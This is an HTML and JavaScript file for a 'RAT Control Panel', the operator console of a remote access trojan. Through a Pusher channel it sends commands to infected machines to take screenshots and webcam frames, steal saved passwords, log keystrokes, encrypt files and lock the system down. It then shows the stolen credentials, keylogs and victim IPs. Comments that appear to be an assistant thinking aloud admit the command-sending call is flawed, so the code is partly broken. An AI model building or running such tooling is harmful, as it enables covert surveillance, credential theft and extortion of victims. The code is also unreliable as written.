<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>RAT Control Panel</title>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <style>
        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        .panel { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px 10px; cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        #log { height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 10px; margin-bottom: 10px; }
        img { max-width: 400px; border: 1px solid #0f0; }
        textarea { width: 100%; height: 100px; background: #000; color: #0f0; border: 1px solid #0f0; }
    </style>
</head>
<body>

<h1>RAT Control Panel</h1>
<div id="log">Waiting for connections...</div>

<div class="panel">
    <h3>Commands</h3>
    <button onclick="sendCmd('screenshot')">Screenshot</button>
    <button onclick="sendCmd('webcam')">Webcam</button>
    <button onclick="sendCmd('get_info')">Get Info</button>
    <button onclick="sendCmd('encrypt')">Encrypt Files</button>
    <button onclick="sendCmd('passwords')">Steal Passwords</button>
    <button onclick="sendCmd('keylog_start')">Start Keylog</button>
    <button onclick="sendCmd('keylog_stop')">Stop Keylog</button>
    <button onclick="sendCmd('lockdown')">Lockdown</button>
</div>

<div class="panel">
    <h3>Response Log</h3>
    <div id="response-area"></div>
</div>

<script>
    // Pusher Configuration
    const pusher = new Pusher('a597db02ce4160d57061', {
        cluster: 'us2',
        forceTLS: true
    });

    const logDiv = document.getElementById('log');
    const responseArea = document.getElementById('response-area');

    function log(msg) {
        logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    // Listen for client connections
    const controlChannel = pusher.subscribe('rat-control');
    controlChannel.bind('client_connected', function(data) {
        log(`Client connected: ${data.id} (${data.ip})`);
        // Subscribe to this specific client's channel to get responses
        const clientChannel = pusher.subscribe(`client_${data.id}`);
        clientChannel.bind('client_response', function(data) {
            handleResponse(data);
        });
    });

    function handleResponse(data) {
        log(`Received response: ${data.type}`);
        const div = document.createElement('div');
        div.style.border = '1px solid #0f0';
        div.style.padding = '10px';
        div.style.marginBottom = '10px';

        if (data.type === 'screenshot') {
            div.innerHTML = `<h4>Screenshot</h4><img src="data:image/png;base64,${data.content}" />`;
        } else if (data.type === 'webcam') {
            div.innerHTML = `<h4>Webcam Frame</h4><img src="data:image/jpeg;base64,${data.content}" />`;
        } else if (data.type === 'info') {
            div.innerHTML = `<h4>System Info</h4><pre>${JSON.stringify(JSON.parse(data.content), null, 2)}</pre>`;
        } else if (data.type === 'passwords') {
            const passwds = JSON.parse(data.content);
            let html = '<h4>Passwords</h4><ul>';
            passwds.forEach(p => {
                html += `<li><b>${p.site}</b>: ${p.user} / ${p.pwd}</li>`;
            });
            html += '</ul>';
            div.innerHTML = html;
        } else if (data.type === 'keylog') {
            div.innerHTML = `<h4>Keylog Data</h4><pre>${data.content}</pre>`;
        } else {
            div.innerHTML = `<h4>Status</h4><p>${data.content}</p>`;
        }
        responseArea.appendChild(div);
    }

    function sendCmd(cmd) {
        // Trigger command to the rat-control channel
        // Note: In a real app, you might want to send this to a specific client channel
        // But for simplicity, we assume the server or a simple broadcast handles it.
        // Actually, Pusher doesn't broadcast to all clients automatically without a server-side trigger.
        // Since you are using Pusher JS here, you need a way to trigger the command.
        
        // Option 1: If you have a server-side script that bridges JS events to Pusher
        // Option 2: Use Pusher's "Trigger" if you have a backend.
        
        // For this demo, let's assume we trigger an event that the Python script listens to?
        // No, the Python script listens to 'cmd_send'.
        // So we need to trigger 'cmd_send' on the 'rat-control' channel.
        pusher.trigger('rat-control', 'cmd_send', { cmd: cmd });
        log(`Sent command: ${cmd}`);
    }
</script>

</body>
</html>
